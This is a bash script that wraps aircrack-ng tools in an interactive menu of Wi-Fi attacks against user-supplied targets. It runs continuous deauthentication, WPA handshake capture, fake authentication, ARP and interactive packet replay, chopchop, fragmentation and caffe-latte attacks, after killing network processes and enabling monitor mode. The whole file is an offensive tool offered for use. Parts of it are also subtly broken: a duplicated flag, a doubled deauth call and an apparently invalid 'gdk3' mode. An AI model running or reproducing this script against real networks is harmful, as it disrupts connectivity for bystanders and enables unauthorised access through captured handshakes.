#!/bin/bash

echo "CiAgX19fX19fICAgX19fX19fX18gIF9fX19fX19fICBfX19fX18gICAgX19fX19fICAgX18gICAgX18gIF9fX19fX19fICBfX19fX19fICAgIF9fX19fXyAgCiAvICAgICAgXCAvICAgICAgICB8LyAgICAgICAgfC8gICAgICBcICAvICAgICAgXCAvICB8ICAvICB8LyAgICAgICAgfC8gICAgICAgXCAgLyAgICAgIFwgCi8kJCQkJCQgIHwkJCQkJCQkJC8gJCQkJCQkJCQvLyQkJCQkJCAgfC8kJCQkJCQgIHwkJCB8IC8kJC8gJCQkJCQkJCQvICQkJCQkJCQgIHwvJCQkJCQkICB8CiQkIHxfXyQkIHwgICAkJCB8ICAgICAgJCQgfCAgJCQgfF9fJCQgfCQkIHwgICQkLyAkJCB8LyQkLyAgJCQgfF9fICAgICQkIHxfXyQkIHwkJCBcX18kJC8gCiQkICAgICQkIHwgICAkJCB8ICAgICAgJCQgfCAgJCQgICAgJCQgfCQkIHwgICAgICAkJCAgJCQ8ICAgJCQgICAgfCAgICQkICAgICQkPCAkJCAgICAgIFwgCiQkJCQkJCQkIHwgICAkJCB8ICAgICAgJCQgfCAgJCQkJCQkJCQgfCQkIHwgICBfXyAkJCQkJCAgXCAgJCQkJCQvICAgICQkJCQkJCQgIHwgJCQkJCQkICB8CiQkIHwgICQkIHwgICAkJCB8ICAgICAgJCQgfCAgJCQgfCAgJCQgfCQkIFxfXy8gIHwkJCB8JCQgIFwgJCQgfF9fX19fICQkIHwgICQkIHwvICBcX18kJCB8CiQkIHwgICQkIHwgICAkJCB8ICAgICAgJCQgfCAgJCQgfCAgJCQgfCQkICAgICQkLyAkJCB8ICQkICB8JCQgICAgICAgfCQkIHwgICQkIHwkJCAgICAkJC8gCiQkLyAgICQkLyAgICAkJC8gICAgICAgJCQvICAgJCQvICAgJCQvICAkJCQkJCQvICAkJC8gICAkJC8gJCQkJCQkJCQvICQkLyAgICQkLyAgJCQkJCQkLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" | base64 -d

# Check if wlan0 interface exists
if ! iwconfig wlan0 > /dev/null 2>&1; then
    echo "wlan0 interface not found. Please check your wireless adapter."
    exit 1
fi

# Put wlan0 into monitor mode
airmon-ng check kill
airmon-ng start wlan0

# Start deauthentication attack
echo "Starting deauthentication attack..."
# Function to perform deauthentication attack
deauth_attack() {

    just_deauth() {
        read -p "Enter target BSSID: " target_bssid
        read -p "Enter target AP MAC: " target_ap_mac
        if [ -z "$target_ap_mac" ]; then
            aireplay-ng --deauth 0 -a "$target_bssid" wlan0
        else
            aireplay-ng --deauth 0 -a "$target_bssid" -a "$target_ap_mac" wlan0
        fi
    }

    deauth_for_handshake() {

        monitoring_with_handshake() {
            echo "Make sure you have monitored all the Wi-Fi devices that appear with airmon-ng wlan0."
            read -p "Enter target BSSID: " target_bssid
            read -p "Enter channel for internet: " channel
            read -p "Enter location to save the captured handshake (use '/' first ex: /home/ezzar/Desktop) : " handshake_location
            airodump-ng -c "$channel" -w "$handshake_location" -d "$target_bssid" wlan0
        }

        deauth() {
            read -p "Enter target BSSID: " target_bssid
            read -p "Enter target AP MAC: " target_client_mac
            read -p "Enter packet count (default/just enter 0): " packet_count
            aireplay-ng --deauth "$packet_count" -a "$target_bssid" -c "$target_client_mac" wlan0
            if [ -z "$packet_count" ]; then
                aireplay-ng --deauth 0 -a "$target_bssid" -c "$target_client_mac" wlan0
            else
                aireplay-ng --deauth "$packet_count" -a "$target_bssid" -c "$target_client_mac" wlan0
            fi
        }

        echo "Select deauth for handshake type:"
        echo "1) monitoring"
        echo "2) go deauth"
        read -p "Enter your choice: " deauth_handshake_choice

        case $deauth_handshake_choice in
            1)
                monitoring_with_handshake
                ;;
            2)
                deauth
                ;;
            *)
                echo "Invalid choice. Exiting."
                exit 1
                ;;
        esac
    }

    echo "Select deauthentication attack type:"
    echo "1) Just deauth"
    echo "2) Deauth for handshake"

    read -p "Enter your choice: " deauth_choice

    case $deauth_choice in
        1)
            just_deauth
            ;;
        2)
            deauth_for_handshake
            ;;
        *)
            echo "Invalid choice. Exiting."
            exit 1
            ;;
    esac
}

# Function to perform fake authentication attack
fakeauth_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target AP MAC: " target_ap_mac
    aireplay-ng --fakeauth 0 -a "$target_ap_mac" -h "$target_bssid" wlan0
}
# Function to perform interactive packet replay attack
interactive_replay_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target AP MAC: " target_ap_mac
    aireplay-ng --interactive -a "$target_ap_mac" -h "$target_bssid" wlan0
}

# Function to perform ARP request replay attack
arp_replay_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target AP MAC: " target_ap_mac
    aireplay-ng --arpreplay -b "$target_ap_mac" -h "$target_bssid" wlan0
}

# Function to perform chopchop attack
chopchop_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target AP MAC: " target_ap_mac
    aireplay-ng --chopchop -b "$target_ap_mac" -h "$target_bssid" wlan0
}

# Function to perform fragmentation attack
fragmentation_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target AP MAC: " target_ap_mac
    aireplay-ng --fragment -b "$target_ap_mac" -h "$target_bssid" wlan0
}

# Function to perform caffe-latte attack
caffe_latte_attack() {
    read -p "Enter target BSSID: " target_bssid
    aireplay-ng --caffe-latte -b "$target_bssid" wlan0
}

# Function to perform gdk3 attack
gdk3_attack() {
    read -p "Enter target BSSID: " target_bssid
    read -p "Enter target AP MAC: " target_ap_mac
    aireplay-ng --gdk3 -b "$target_ap_mac" -h "$target_bssid" wlan0
}

monitor_mode() {
    airodump-ng wlan0
}

monitor_mode_change_channel() {
    read -p "Enter channel number: " channel
    airodump-ng -c "$channel" wlan0
}


# Display additional menu options
echo "Select attack type:"
echo "1) Deauthentication attack"
echo "2) Fake authentication attack"
echo "3) Interactive packet replay attack"
echo "4) ARP request replay attack"
echo "5) Chopchop attack"
echo "6) Fragmentation attack"
echo "7) Caffe-latte attack"
echo "8) GDK3 attack"
echo "9) just monitoring mode"
echo "10) monitoring mode with channel change"
read -p "Enter your choice: " choice

# Execute selected attack
case $choice in
    1)
        deauth_attack
        ;;
    2)
        fakeauth_attack
        ;;
    3)
        interactive_replay_attack
        ;;
    4)
        arp_replay_attack
        ;;
    5)
        chopchop_attack
        ;;
    6)
        fragmentation_attack
        ;;
    7)
        caffe_latte_attack
        ;;
    8)
        gdk3_attack
        ;;
    9)
        monitor_mode
        ;;
    10)
        monitor_mode_change_channel
        ;;
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac